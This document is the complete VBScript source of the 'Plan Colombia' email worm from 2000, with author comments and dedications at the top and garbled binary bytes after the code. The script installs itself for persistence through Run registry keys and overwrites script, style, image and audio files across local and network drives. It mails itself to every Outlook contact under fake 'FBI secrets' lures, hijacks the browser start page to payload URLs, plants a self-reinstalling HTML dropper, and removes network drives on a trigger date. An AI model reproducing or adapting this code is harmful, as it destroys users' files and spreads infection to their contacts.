rem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogot� 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina Mar�a" from "Santa fe de Bogot�"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP.vbs"
 Else
  If numero = 2 Then
    polye = ".JPG.vbs"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub
                                                                                                                     ���A��{�ֆU%3Pz��Բr�7o �|l0���d����~�O�Xc�r�3�e6%:l�m��:��V����>��Y���Ϣr1v�+.��(�����oK*��~4��B��"�����!�DTX��,�q��KˠqĪF�;헌�߈�eW�2��'fA�(�r����~v��a2��BU#�8ta��{s
5�� �]H�ܶݧo]A)ԉ����m��X�$�a(�d���M�)֓k$m��,یd��k�2)�!�\B��.�`�ęĕcQ�;�D&�O�l&Qa��x'��6[�{I���a���^h�ǂbRh�v�~泹�wY��	��F$�8�nI�[�ݴ�eQ���$����O*�kC0�!��SUA��\)��,	Â]X8���I'gR]���*N��I�,
�P�����[� �jI�k���ŰK��H@�R8��Wař�W�VV Eg0Y���G ]J�0X9%�Y�Ҝ���a�꧟�j?�A�FEYm��H�;n����zm�ܘ��K���Y�/M��c�"��Lc�u�����>�,^���#)$C��������x �vX�ٰ.(9W�b�cK��v{[׷�(��6��Vfz:^�� �����(f�z�K]�U
ȳ����;kЊ}h{!�:sDY����T�H���|_���J��U!l�$ZQ�s���i��1/Yn�5z|��6?q���U��]���x�Z�Hƨ�fL
[�mu��SU�H������h�ӎ����s3�27��E�0Q�*�e��6yV
��$5�gQԹ�6yf.�g�����Rɯm%���qg׃�D����Bm����{����^�����q==Hn���W�oY��7���ZE{�����D��R]�m#F6�Cj�~�Q��gJ�~�K�$�Ba��YY�,i��-�u��s���"�ފ����\;J�[dxC$���H?r�xq=YN�������@�fU�����"��o��ڣ�Q>�>�޷�D�)%�x�5Z��	��!#����m�#,D+��=��[�Tc¢u"��ϲ�b��2 "���H\�Q#l<7�8�3گe������ �w�%`��0í�n` 6į�"	��u�b��b��v�(�b��Ϧ.G�듪B����"B���[���� �o����%����_���(��v�eǸ7"ʻF�-{��*e�r>�ʈ����������d����߇��cNt	��bQ@�a�W��MP@=�Di>��9�U��uo�}�4��G-Jؐ��O�ת6�C^�K�֦� �@"�=<���/�`���E�[�Y��W���RP�r3G����e�T_v�<u��e`ڙ���9^��7�#=�O������~����	�i�T��U�r\�VP����ްhƨ�F�E?�Q�9�|5,���o]n$^�Ϩ�;v��$�9j!$�s��[T�Â�zn�\Ĵ)�_܈� �i��|�͎LɄ
1�`����5XD��͹3b�,�y��f�:w-t�U��=�;��9�a�.@�񲞃N7�|�Ұ��bH�b�ʐ%M�,��;���ʘY.b-�/"���HRNE�����(�3=�t���m�)̦b�x���9̵ڋe�BX�r�+h1Tq�1x�IʛJj9���OHf}ZY�zB�߮z�����nsyw��Q�zrC����t�J�]4� ���B1j
���������t	d?��>�<��V0#e�jG�\kz�8R���ֶ��IQ ���{�tʋô*����8��s���3�I�;d\���4�B�Ү̖W����*I�U�a�X��AT=)���g"��/�`
:x��n5Yh�)-�v�ŐO׉i��W��&:��)s�S^׀M!��tĬRr8��3s��$�3M�#i��i#>�O{�;+ŉX�{"�5j�؋*-��ac�*9��7�.��^||��p� ^5hx���zc�d(y��ν���#�7Qv��=�2�fl�X�9Ի���>����?0�d9岮e�?u_�/A�Gu��c���Asp�|�F-�r"�΄���2-�8�s�ƺ��ɛXcg�rB��Ԑ�?��ٕ_b%b�?�:r:�8��p�hA��rj\(�k�/Q�����c[�Ɓ�d����lw������\�[e[4�-�׆�A{��LW��� ��#f��D}�3:��� ���/P�����Ǿh��OM!Sly�$�J�Ap�s�Xx���MMd��2Z��FR�aa&��1�b�a8с��B���c�]x�n�ُ�M�N����f]�^�h:�1�{��d`��S�x����Qɹ�x�!��������E���&�ˬ"{�,~�T�)�������y��veo+O@B]��!�{�d��y�}z�e���L��)�h�GpӞ�����,"W���������v^?�� �ɥ ֖C[Ɍw��^ˏ��,���Ӫ�~C�/.��m)j��H�fq�6�A�y�0��L)�8K�Ƴ��_�Ge��Z���P�\�S���BL��f���n�F͚m4]:���me̙.ff�ӝM��H�2��B���Zx���C��������=T0��������IP��a`w���l2��jO0��*b���VJ�J����O��ч[��Ô���N���?-���Q�� t�z����%2���̔��8�X�&�<U���d�\�5ߔf�#�d:��#�0*d�HO	�T|�����=��z��N*B�[�Ã�<[�tcy�o\O��q�0M��ޤ�UW=�r����b%v���E��	ꥏ�> u+c5�K�O����~��;��B�&���[a�t^gjYe
�i��營��F���FLMw"�15��ܿ�n��"�t7b�T�rEr� *��m�ji��ks9B����*�9��O��^�%�;RV��j�YQ��-����(����(j��Dx���~���
z�*��Ƥ��8��P$��KWi%t��R�+���X���ry&�^UR����-rӕ�8�5�,�n�(Н���K��g���Bu4<X��tC����ʺ�XW���Q}�g��`���]���swzh@��Ю̅�o��F?�$g���2r��h����Tj+�H�ޱȰ�S��?d}pD�G��(�3�ؽ_�y�]C����N��*�]�tXJ7w�M
/�y"���U{�0�t���֔w��2t�����y���N N��Q�t�i�g���-T5�FPs��4j�7EKQ����beBP��g��*��4M����H�]?wc���*!`c�"���ys����b<e���>�Xp���;\��rТL��c��	e�r��X�!�� K�Z���q{�9J&�V��	2��z>m?��LuGOL��M���P@�ީ��{ǟ��D�%/�8V!�F�XCG���ңB���A��/���|�3��dJU��H8�-�y����5�ZPu��%ԟY�zYL6b�+���%�>,�v'{��Z�]��+x_��Q(���M�q���(�r�/<�X�� ]���#�l�`�6=��W��I�c��~�ej�3Э`�0��"���������G�B��m�lv8tK��B�z*>Ĉ��]�� T7�p�����>�	�T�9����_�HH�Gj�c���Ը�"�����f����o=`?�G�V�h�^	�W��1���͡����1f�r��Hi�o2+a�,�XK$�=����n���Q��搸��{�c�oA􍃱�<�@�J�{�dJyhDP��aK�!�q
��S!�ڡ5�A�l�<x��c�m�P=D8hW��4�o�0�[��E_�3�����"
�VWs�dq�O������vkh�\;�a�U�U7������뵴_�Sp�n�c\������_��K�,�� �fϮFTK^��v3<;M�߀��S���a%��rQG��b�@q�
��)`�c#5ˉ>��G�u@W0I��]$�]�"�m/�bQ�d(��ۻx�7?mt!��u�����Z���k�	�d������